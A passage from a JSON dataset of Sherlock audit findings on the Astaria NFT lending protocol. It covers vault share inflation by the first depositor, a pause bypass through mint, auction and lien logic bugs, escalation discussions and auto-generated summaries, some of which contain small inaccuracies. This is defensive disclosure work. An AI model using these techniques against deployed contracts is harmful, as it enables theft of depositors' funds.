0.\n\nFor the first deposit, mint a fixed amount of shares, e.g. 10**decimals()\n```jsx\nif (supply == 0) {\n    return 10**decimals; \n} else {\n    return assets.mulDivDown(supply, totalAssets());\n}\n```",
      "summary": "\nThis bug report is about the issue M-13, which was found by eight people and is related to ERC4626 vault. It states that the first depositor of an ERC4626 vault can maliciously manipulate the share price by depositing the lowest possible amount (1 wei) of liquidity and then artificially inflating ERC4626.totalAssets. This can lead to the share price becoming very high and, due to rounding down, the next depositor losing their deposited funds. The code snippet provided shows that the shares are calculated as follows: `return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());`. The tool used for this bug was Manual Review and the recommendation is to mint a fixed amount of shares for the first deposit, e.g. 10**decimals().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/143",
      "tags": [],
      "finders": [
        "pashov",
        "0xNazgul",
        "Jeiwan",
        "joestakey",
        "neila",
        "\\_\\_141345\\_\\_",
        "ak1",
        "rvierdiiev",
        "ctf\\_sec"
      ]
    },
    {
      "id": "3687",
      "title": "M-12: Loan duration can exceed the end of the next epoch",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/170 \n\n## Found by \n0xRajeev\n\n## Summary\n\nLoan duration can exceed the end of the next epoch, which deviates from the protocol specification.\n\n## Vulnerability Detail\n\nFrom the specs: \"The duration of new loans is restricted to not exceed the end of the next epoch. For example, if a PublicVault is 15 days into a 30-day epoch, new loans must not be longer than 45 days.\"\n\nHowever, there's no enforcement of this requirement. \n\n## Impact\n\nThe implementation does not adhere to the spec: Loan duration can exceed the end of the next epoch, which breaks protocol specification and therefore lead to miscalculations and potential fund loss.\n\n\n## Code Snippet\n\n1. https://docs.astaria.xyz/docs/protocol-mechanics/epochs\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L146-L228\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nImplement as per specification or revisit the specification.",
      "summary": "\nThis bug report is about a vulnerability found in a protocol related to the Astaria platform. The vulnerability is that loan duration can exceed the end of the next epoch, which deviates from the protocol specification. This means that the implementation does not adhere to the spec and could lead to miscalculations and potential fund loss. The code snippet that was used to detect this vulnerability is available in the report. The recommendation is to either implement as per the specification or revisit the specification.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/170",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3686",
      "title": "M-11: Buyouts of shorter duration liens can lead to the loss of borrower funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/171 \n\n## Found by \n0xRajeev\n\n## Summary\n\nLiens whose duration is equal to (or maybe less than) `minDurationIncrease` cannot be bought out to be replaced by newer liens with lower interest rates but the same duration. This locks the borrower out of better-termed liens, effectively resulting in the loss of their funds \n \n## Vulnerability Detail\n\nLiens whose duration is equal to (or maybe less than) `minDurationIncrease` cannot be bought out to be replaced by newer liens with lower interest rates but the exact duration because it results in an underflow in `_getRemainingInterest()`.\n\nExample scenario: if the strategy`liendetails.duration` is <= 14 days, then it's impossible to do a buyout of a new lien because the implemented check requires to wait `minDurationIncrease`, which is set to 14 days. However, if the buyer waits 14 days, the lien is expired, which triggers the earlier mentioned underflow.\n\n## Impact\n\nThe borrower gets locked out of better-termed liens, effectively resulting in the loss of their funds because of extra interest paid on older liens.\n \n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L573\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L489-L490\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRevisit the checking logic and minimum duration as it applies to shorter-duration loans.\n\n## Discussion\n\n**SantiagoGregory**\n\nWe updated buyoutLien() to check for a lower interest rate *or* higher duration.",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter contract of the Sherlock-Audit project. The issue is that liens whose duration is equal to (or less than) the `minDurationIncrease` cannot be bought out to be replaced by newer liens with lower interest rates but the same duration. This results in an underflow in `_getRemainingInterest()` and locks the borrower out of better-termed liens, effectively resulting in the loss of their funds because of extra interest paid on older liens. This was found manually by 0xRajeev and the code snippets that are affected are located at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L573 and https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L489-L490. The recommendation is to revisit the checking logic and minimum duration as it applies to shorter-duration loans. SantiagoGregory suggested to update the buyoutLien() function to check for a lower interest rate or higher duration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/171",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3685",
      "title": "M-10: Minting public vault shares while the protocol is paused can lead to LP fund loss",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/174 \n\n## Found by \nTurnipBoy, 0xRajeev\n\n## Summary\n\nAssets can be deposited into public vaults by LPs with `PublicVault.mint` function to bypass a possible paused protocol.\n\n## Vulnerability Detail\n\nThe PublicVault contract prevents calls to the `PublicVault.deposit` function while the protocol is paused by using the `whenNotPaused` modifier.\n\nThe `PublicVault` contract extends the `ERC4626Cloned` contract, which has two functions to deposit assets into the vault: the `deposit` function and the `mint` function. The latter function, however, is not overwritten in the PublicVault contract and therefore lacks the appropriate `whenNotPaused` modifier. \n\n## Impact\n\nLPs can deposit assets into public vaults with the `PublicVault.mint` function to bypass a possible paused protocol. This can lead to LP fund loss depending on the reason for the protocol pause and the incident response.\n \n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/PublicVault.sol#L222\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/ERC4626-Cloned.sol#L324\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nOverride the mint function and add the `whenNotPaused` modifier\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nCauses material loss of funds. Should be high risk\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Causes material loss of funds. Should be high risk\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation rejected.\n\nThis issue depends on the pausable state being active, also, it has the potential to lead to a loss of funds, it's not a guarantee. \n\n**sherlock-admin**\n\n> Escalation rejected.\n> \n> This issue depends on the pausable state being active, also, it has the potential to lead to a loss of funds, it's not a guarantee. \n\nThis issue's escalations have been rejected!\n\nContestants' payouts and scores will not be updated.\n\nAuditors who escalated this issue will have their escalation amount deducted from future payouts.",
      "summary": "\nThis bug report is about a vulnerability found in the PublicVault contract of the Astaria protocol. It was discovered by TurnipBoy and 0xRajeev and is known as Issue M-10. The vulnerability is that the PublicVault contract does not have the `whenNotPaused` modifier for its `mint` function, allowing LPs to deposit assets into the public vaults while the protocol is paused. This could potentially lead to LP fund loss, depending on the reason for the protocol pause and the incident response. \n\nThe bug report includes two code snippets to show where the vulnerability is located. It was found through manual review. The issue was then escalated for 1 USDC and it was suggested that it should be considered a high risk. However, the escalation was rejected as the issue depends on the pausable state being active and it only has the potential to lead to a loss of funds, not a guarantee. \n\nThe report recommends overriding the mint function and adding the `whenNotPaused` modifier to prevent this vulnerability. Auditors who escalated this issue will have their escalation amount deducted from future payouts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/174",
      "tags": [],
      "finders": [
        "0xRajeev",
        "TurnipBoy"
      ]
    },
    {
      "id": "3684",
      "title": "M-9: Auctions run for less time than intended",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/186 \n\n## Found by \nobront, 0xRajeev, hansfriese, peanuts, csanuragjain, chainNue\n\n## Summary\n\nAuctions run for less time than intended causing them to be not economically efficient for the lenders, thus causing a suboptimal credit of liquidation funds to them.\n\n## Vulnerability Detail\n\nFrom the documentation/comments, we can infer that `firstBidTime` is supposed to be `// The time of the first bid` and duration is supposed to be `// The length of time to run the auction for, after the first bid was made.`\n\nHowever, when an auction is created in `createAuction()`, the auction's `firstBidTime` is incorrectly initialized as `block.timestamp.safeCastTo64()` instead of `0`. This is premature initialization because the auction was only created here and no bid has been made yet via `createBid()`. The code in `createBid()` which check for `firstBidTime == 0 `is more evidence that the initialization in `createAuction()` is incorrect.\n\n## Impact\n\nThis causes auctions to run for less time than intended if the first bid comes at a much later time after the auction was created. A shorter auction time could potentially allow fewer bids and cause it to be not economically efficient for the lenders, thus causing a suboptimal credit of liquidation funds to them.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/interfaces/IAuctionHouse.sol#L12-L13\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L80\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L166-L176\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`createAuction()` should initialize `firstBidTime = 0`.\n\n## Discussion\n\n**androolloyd**\n\nwill fix but its a convention issue we want auctions to start immediately not on first bid",
      "summary": "\nIssue M-9 is a bug found in the code for the auction house in the Astaria project. This bug causes the auction to run for less time than intended, resulting in fewer bids and a suboptimal credit of liquidation funds to the lenders. The bug is caused by the incorrect initialization of the `firstBidTime` in the `createAuction()` function, which is set to `block.timestamp.safeCastTo64()` instead of `0` as it should be. The bug was discovered through manual review and the recommended solution is to initialize `firstBidTime = 0` in the `createAuction()` function. The discussion suggests that the fix will be implemented, but it is more of a convention issue rather than a bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/186",
      "tags": [],
      "finders": [
        "csanuragjain",
        "chainNue",
        "0xRajeev",
        "hansfriese",
        "peanuts",
        "obront"
      ]
    },
    {
      "id": "3683",
      "title": "M-8: Incorrect `LienToken.changeInSlope` calculation can lead to vault insolvency",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/189 \n\n## Found by \n0xRajeev, hansfriese\n\n## Summary\n\nThe calculation of `newSlope` in `changeInSlope()` is incorrect which can lead to vault insolvency.\n\n## Vulnerability Detail\n\nContrary to the `changeInSlope` function, the `calculateSlope` function uses the `_getOwed` function to calculate the owed amount (incl. the interest). The interest is calculated with the `_getInterest` function. This function takes care of the `lien.last` and also if a lien is expired already. This logic is completely missing in the `changeInSlope` for the `newSlope` calculation which makes it incorrect. Also, very importantly, in the `changeInSlope` function, the `INTEREST_DENOMINATOR` is missing which makes the value inflated causing an underflow error in the last line of `changeInSlope` function: `slope = oldSlope - newSlope`;. `oldslope`, which accounts for the `INTEREST_DENOMINATOR`, is less than `newSlope`.\n\n## Impact\n\nThe incorrect `changeInSlope()` calculation can lead to reverts and vault insolvency because users cannot determine the implicit value of vaults while interacting with it as borrowers or lenders.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L453-L469\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L440-L445\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nMake `changeInSlope()` consistent with `calculateSlope()` by implementing a separate helper function to calculate the interest accounting for all the parameters and reusing it in both places.",
      "summary": "\nThis bug report is about an incorrect calculation of `LienToken.changeInSlope` which can lead to vault insolvency. The calculation of `newSlope` in `changeInSlope()` is incorrect compared to the `calculateSlope` function. This is because the interest calculation is missing in the `changeInSlope` for the `newSlope` calculation, and the `INTEREST_DENOMINATOR` is missing which causes an underflow error. This incorrect calculation can lead to reverts and vault insolvency. The bug was found by 0xRajeev and hansfriese and was confirmed through manual review. The recommendation is to make `changeInSlope()` consistent with `calculateSlope()` by implementing a separate helper function to calculate the interest accounting for all the parameters and reusing it in both places.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/189",
      "tags": [],
      "finders": [
        "0xRajeev",
        "hansfriese"
      ]
    },
    {
      "id": "3682",
      "title": "M-7: `LienToken.createLien` may prevent liens that satisfy their terms of `maxPotentialDebt`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/192 \n\n## Found by \n0xRajeev, hansfriese\n\n## Summary\n\nThe `potentialDebt` calculation in `createLien` is incorrect.\n\n## Vulnerability Detail\n\nThe calculated `potentialDebt` is effectively `(impliedRate + totalDebt) * params.terms.duration` because `getImpliedRate()` returns `impliedRate = impliedRate.mulDivDown(1, totalDebt);`. The calculated `potentialDebt` because of multiplying `totalDebt` by duration is significantly higher than it actually is and so will fail the `params.terms.maxPotentialDebt` check and revert. \n\n## Impact\n\nThis will cause DoS on valid lien creation.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L256-L260\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L526\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nHave `getImpliedRate()` *not* do `impliedRate = impliedRate.mulDivDown(1, totalDebt);` and calculate `potentialDebt` as `totalDebt * (1 + impliedRate *  params.terms.duration * mulDivDown(1, INTEREST_DENOMINATOR)`.",
      "summary": "\nThis bug report is about an issue M-7 in the Sherlock Audit 2022-10-Astaria-Judging project. The issue was found by 0xRajeev and hansfriese. The issue is with the calculation of the `potentialDebt` in the `createLien` function. The calculated `potentialDebt` is effectively `(impliedRate + totalDebt) * params.terms.duration` because `getImpliedRate()` returns `impliedRate = impliedRate.mulDivDown(1, totalDebt);`. This is significantly higher than it actually is and so will fail the `params.terms.maxPotentialDebt` check and revert. This will cause a denial of service (DoS) on valid lien creation. The code snippets related to the issue are located at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L256-L260 and https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L526. The recommendation to fix this issue is to have `getImpliedRate()` not do `impliedRate = impliedRate.mulDivDown(1, totalDebt);` and calculate `potentialDebt` as `totalDebt * (1 + impliedRate *  params.terms.duration * mulDivDown(1, INTEREST_DENOMINATOR)`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/192",
      "tags": [],
      "finders": [
        "0xRajeev",
        "hansfriese"
      ]
    },
    {
      "id": "3681",
      "title": "M-6: `AstariaRouter.commitToLiens` will revert if the protocol fee is enabled",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/195 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe function `commitToLiens()` will revert in `getProtocolFee()`, which prevents borrowers from depositing collateral and requesting loans in the protocol.\n\n## Vulnerability Detail\n\nIf the protocol fee is enabled by setting `feeTo` to a non-zero address, then `getProtocolFee()` will revert because of division-by-zero given that `protocolFeeDenominator` is `0` without any initialization and no setter (in `file()`) for setting it.\n \n## Impact\n\nThe function `commitToLiens()` will revert if the protocol fee is enabled thus preventing borrowers from depositing collateral and requesting loans in the protocol thereby failing to bootstrap its core NFT lending functionality.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L66-L67\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/AstariaRouter.sol#L441-L443\n3. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L337-L340\n4. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L331\n5. https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/VaultImplementation.sol#L242-L250\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInitialize protocol fee numerator and denominator in `AstariaRouter` and add their setters to `file()`.\n\n## Discussion\n\n**secureum**\n\nEscalate for 2 USDC.\n\nWe do not think this is a duplicate issue of #204. While both are about `commitToLiens()` reverting, the triggering locations, conditions and therefore the recommendations are entirely different. This issue is specific to non-initialization of protocol fee variables as described above.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> We do not think this is a duplicate issue of #204. While both are about `commitToLiens()` reverting, the triggering locations, conditions and therefore the recommendations are entirely different. This issue is specific to non-initialization of protocol fee variables as described above.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted\n\n**sherlock-admin**\n\n> Escalation accepted\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the AstariaRouter.sol file of the 2022-10-astaria-judging project. The function commitToLiens() will revert in getProtocolFee(), which prevents borrowers from depositing collateral and requesting loans in the protocol. This is due to the fact that the protocol fee denominator is set to 0 without any initialization or setter in the file. This issue has an impact on the core NFT lending functionality of the protocol, as borrowers are unable to deposit collateral and request loans. The code snippets provided in the report are located in the AstariaRouter.sol and VaultImplementation.sol files. The recommendation is to initialize the protocol fee numerator and denominator in AstariaRouter and add their setters to the file. Two users have staked 2 USDC to escalate the issue, and this has been accepted. The contestants' payouts and scores will be updated according to the changes made on this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/195",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3680",
      "title": "M-5: Extension logic incorrectly extends the auction by an additional amount of existing duration",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/201 \n\n## Found by \nyixxas, minhquanym, 0xRajeev, Prefix, bin2chen\n\n## Summary\n\nIncorrect auction extension logic extends the auction by an additional amount of the previous duration instead of extending it by 15 minutes.\n\n## Vulnerability Detail\n\nThe calculation of `newDuration` incorrectly adds `duration` in the auction extension logic. This causes the new duration to be extended by an additional amount of the existing duration, instead of an additional 15 minutes (`timeBuffer`), when a bid is created in the last 15 mins of the existing auction duration.\n\n## Impact\n\nDelayed payout of funds/collateral upon auction completion only after the newly extended duration.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L135-L137\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the calculation to `uint64 newDuration = uint256(block.timestamp + timeBuffer - firstBidTime).safeCastTo64();`",
      "summary": "\nThis bug report describes an issue with the auction extension logic in the Astaria auction house. The calculation for the new duration incorrectly adds the existing duration, instead of 15 minutes (timeBuffer), when a bid is created in the last 15 minutes of the existing auction duration. This causes the new duration to be extended by an additional amount of the existing duration. The impact of this issue is a delayed payout of funds/collateral upon auction completion. The bug was discovered by yixxas, minhquanym, 0xRajeev, Prefix, and bin2chen and the code snippet which needs to be changed is given in the report. The recommended change is to replace the calculation with `uint64 newDuration = uint256(block.timestamp + timeBuffer - firstBidTime).safeCastTo64();`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/201",
      "tags": [],
      "finders": [
        "yixxas",
        "minhquanym",
        "bin2chen",
        "0xRajeev",
        "Prefix"
      ]
    },
    {
      "id": "3679",
      "title": "M-4: Outstanding debt is not guaranteed to be covered by auctions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/203 \n\n## Found by \n0xRajeev\n\n## Summary\n\nThe best-effort one-time English auction for borrower collateral is not economically efficient to drive auction bids towards reaching the total outstanding debt, which leads to loss of LP funds.\n\n## Vulnerability Detail\n\nWhen any lien against a borrower collateral is not paid within the lien duration, the underlying collateral is put up for auction where bids can come in at any price. The borrower is allowed to cancel the auction if the current bid is lower than the reserve price which is set to the total outstanding debt. The reserve price is not enforced anywhere else. If there are no bids, the liquidator will receive the collateral.\n\n## Impact\n\nThis auction design of a best-effort one-time English auction is not economically efficient to drive auction bids towards reaching the total outstanding debt which effectively leads to loss of LP funds on unpaid liens.\n\n## Code Snippet\n\n1. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L210-L217\n2. https://github.com/sherlock-audit/2022-10-astaria/blob/main/lib/astaria-gpl/src/AuctionHouse.sol#L178-L182\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider alternative auction design mechanisms e.g. a Dutch auction where the auction starts at the reserve price to provide a higher payment possibility to the LPs.\n\n## Discussion\n\n**SantiagoGregory**\n\nWe're switching to a Dutch auction through Seaport.\n\n**Evert0x**\n\nDowngrading to info as it's a protocol design choice.\n\n**secureum**\n\nEscalate for 2 USDC.\n\nThis finding is based on current protocol design and implementation (i.e. there was no documentation suggesting their future switch to Dutch auction). Based on the protocol team's response above, they effectively confirm the current design choice (_and_ implementation) to be a serious enough issue that they are changing the protocol design to what is recommended by this finding. Just because it is a design issue does not deem this to be downgraded to informational — design drives implementation and is harder to change. Moving to a Dutch auction, as recommended, will affect significant parts of protocol implementation.\n\nTherefore, we still think this is of Medium severity impact, if not higher.\n\ncc @berndartmueller @lucyoa\n\n**sherlock-admin**\n\n > Escalate for 2 USDC.\n> \n> This finding is based on current protocol design and implementation (i.e. there was no documentation suggesting their future switch to Dutch auction). Based on the protocol team's response above, they effectively confirm the current design choice (_and_ implementation) to be a serious enough issue that they are changing the protocol design to what is recommended by this finding. Just because it is a design issue does not deem this to be downgraded to informational — design drives implementation and is harder to change. Moving to a Dutch auction, as recommended, will affect significant parts of protocol implementation.\n> \n> Therefore, we still think this is of Medium severity impact, if not higher.\n> \n> cc @berndartmueller @lucyoa\n\nYou've created a valid escalation for 2 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepted based on comment from Watson\n\n**sherlock-admin**\n\n> Escalation accepted based on comment from Watson\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about an issue found in the Sherlock Audit platform. The issue found is that the best-effort one-time English auction for borrower collateral is not economically efficient to drive auction bids towards reaching the total outstanding debt, which leads to loss of LP funds. This is due to the fact that the reserve price is not enforced anywhere else, meaning that if there are no bids, the liquidator will receive the collateral. This issue is of medium severity impact, if not higher, and can be seen in the code snippets provided.\n\nThe recommendation for this issue is to consider alternative auction design mechanisms, such as a Dutch auction, where the auction starts at the reserve price to provide a higher payment possibility to the LPs. The protocol team has accepted this recommendation, and the contestants' payouts and scores will be updated accordingly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/203",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "3678",
      "title": "M-3: _makePayment is logically inconsistent with how lien stack is managed causing payments to multiple liens to fail",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-10-astaria-judging/issues/232 \n\n## Found by \nTurnipBoy\n\n## Summary\n\n`_makePayment(uint256, uint256)` looping logic is inconsistent with how `_deleteLienPosition` manages the lien stack. `_makePayment` loops from 0 to `openLiens.length` but `_deleteLienPosition` (called when a lien is fully paid off) actively compresses the lien stack. When a payment pays off multiple liens the compressing effect causes an array OOB error towards the end of the loop.\n\n## Vulnerability Detail\n\n    function _makePayment(uint256 collateralId, uint256 totalCapitalAvailable)\n      internal\n    {\n      uint256[] memory openLiens = liens[collateralId];\n      uint256 paymentAmount = totalCapitalAvailable;\n      for (uint256 i = 0; i < openLiens.length; ++i) {\n        uint256 capitalSpent = _payment(\n          collateralId,\n          uint8(i),\n          paymentAmount,\n          address(msg.sender)\n        );\n        paymentAmount -= capitalSpent;\n      }\n    }\n\n`LienToken.sol#_makePayment(uint256, uint256)` loops from 0 to `openLiens.Length`. This loop attempts to make a payment to each lien calling `_payment` with the current index of the loop.\n\n    function _deleteLienPosition(uint256 collateralId, uint256 position) public {\n      uint256[] storage stack = liens[collateralId];\n      require(position < stack.length, \"index out of bounds\");\n\n      emit RemoveLien(\n        stack[position],\n        lienData[stack[position]].collateralId,\n        lienData[stack[position]].position\n      );\n      for (uint256 i = position; i < stack.length - 1; i++) {\n        stack[i] = stack[i + 1];\n      }\n      stack.pop();\n    }\n\n`LienToken.sol#_deleteLienPosition` is called on liens when they are fully paid off. The most interesting portion of the function is how the lien is removed from the stack. We can see that all liens above the lien in question are slid down the stack and the top is popped. This has the effect of reducing the total length of the array. This is where the logical inconsistency is. If the first lien is paid off, it will be removed and the formerly second lien will now occupy it's index. So then when `_payment` is called in the next loop with the next index it won't reference the second lien since the second lien is now in the first lien index.\n\nAssuming there are 2 liens on some collateral. `liens[0].amount = 100` and `liens[1].amount = 50`. A user wants to pay off their entire lien balance so they call  `_makePayment(uint256, uint256)` with an amount of 150. On the first loop it calls `_payment` with an index of 0. This pays off `liens[0]`. `_deleteLienPosition` is called with index of 0 removing `liens[0]`. Because of the sliding logic in `_deleteLienPosition` `lien[1]` has now slid into the `lien[0]` position. On the second loop it calls `_payment` with an index of 1. When it tries to grab the data for the lien at that index it will revert due to OOB error because the array no long contains an index of 1.\n\n## Impact\n\nLarge payment are impossible and user must manually pay off each liens separately \n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L410-L424\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nPayment logic inside of `AuctionHouse.sol` works. `_makePayment` should be changed to mimic that logic.\n\n\n\n## Discussion\n\n**IAmTurnipBoy**\n\nEscalate for 1 USDC\n\nNot a dupe of #190, issue is with the lien array is managed as the payments are made. Fixing #190 wouldn't fix this.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Not a dupe of #190, issue is with the lien array is managed as the payments are made. Fixing #190 wouldn't fix this.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Evert0x**\n\nEscalation accepeted",
      "summary": "\nThis bug report is about an issue found in the code for the LienToken.sol file. The `_makePayment(uint256, uint256)` looping logic is inconsistent with how `_deleteLienPosition` manages the lien stack. This inconsistency creates an issue when a payment is made that pays off multiple liens as the compressing effect of `_deleteLienPosition` causes an array out of bounds error towards the end of the loop.\n\nThe bug was found by TurnipBoy who used manual review as the tool for detection. The code snippet in question is located at https://github.com/sherlock-audit/2022-10-astaria/blob/main/src/LienToken.sol#L410-L424. The impact of this bug is that large payments are impossible and users must manually pay off each lien separately. The recommendation is that the payment logic inside of `AuctionHouse.sol` should be used as a model for how to fix the issue with `_makePayment`.\n\nIAmTurnipBoy and sherlock-admin then escalated the issue for 1 USDC and Evert0x accepted the escalation. The escalation can be edited or deleted anytime before the 48-hour window closes. After that, the escalation becomes final.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Astaria",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-10-astaria-judging/issues/232",
      "tags": [],
      "finders": [
        "TurnipBoy"
      ]
    },
    {
      "id": "3677",
      "title": "M-2: If an auction has no bidder, the NFT ownership should go back to the loan lenders",
      "impact": "MEDIUM",
